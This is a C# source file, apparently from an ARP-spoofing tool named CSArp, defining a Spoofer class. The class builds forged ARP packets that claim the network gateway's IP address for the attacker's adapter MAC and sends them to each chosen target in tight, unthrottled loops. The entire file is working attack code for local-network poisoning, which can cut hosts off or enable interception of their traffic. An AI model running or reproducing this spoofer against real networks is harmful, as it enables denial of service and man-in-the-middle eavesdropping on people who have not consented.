using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using CSArp.Model.Utilities;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace CSArp.Model
{
    public class Spoofer
    {
        private readonly List<Task> _spoofingTasks = new List<Task>();
        private CancellationTokenSource _spoofingCts;

        public void Start(
            Dictionary<IPAddress, PhysicalAddress> targetList,
            IPAddress gatewayIpAddress,
            PhysicalAddress gatewayMacAddress,
            LibPcapLiveDevice networkAdapter)
        {
            StopAll();
            _spoofingCts = new CancellationTokenSource();

            if (!networkAdapter.Opened)
            {
                networkAdapter.Open();
            }

            foreach (var target in targetList)
            {
                var arpPacketForGatewayRequest = new ArpPacket(ArpOperation.Request, "00-00-00-00-00-00".Parse(), gatewayIpAddress, networkAdapter.MacAddress, target.Key);
                var ethernetPacketForGatewayRequest = new EthernetPacket(networkAdapter.MacAddress, gatewayMacAddress, EthernetType.Arp)
                {
                    PayloadPacket = arpPacketForGatewayRequest
                };

                _spoofingTasks.Add(Task.Run(() => SendSpoofingPacket(target.Key, target.Value, ethernetPacketForGatewayRequest, networkAdapter, _spoofingCts.Token), _spoofingCts.Token));
            }
        }

        public void StopAll()
        {
            _spoofingCts?.Cancel();
            _spoofingTasks.Clear();
        }

        private static void SendSpoofingPacket(
            IPAddress ipAddress,
            PhysicalAddress physicalAddress,
            EthernetPacket ethernetPacket,
            LibPcapLiveDevice captureDevice,
            CancellationToken cancellationToken)
        {
            DebugOutput.Print("Spoofing target " + physicalAddress + " @ " + ipAddress);

            try
            {
                while (!cancellationToken.IsCancellationRequested)
                {
                    captureDevice.SendPacket(ethernetPacket);
                }
            }
            catch (PcapException ex)
            {
                DebugOutput.Print("PcapException @ Spoofer.SendSpoofingPacket() [" + ex.Message + "]");
            }

            DebugOutput.Print("Spoofing thread terminating for " + physicalAddress + " @ " + ipAddress);
        }
    }
}
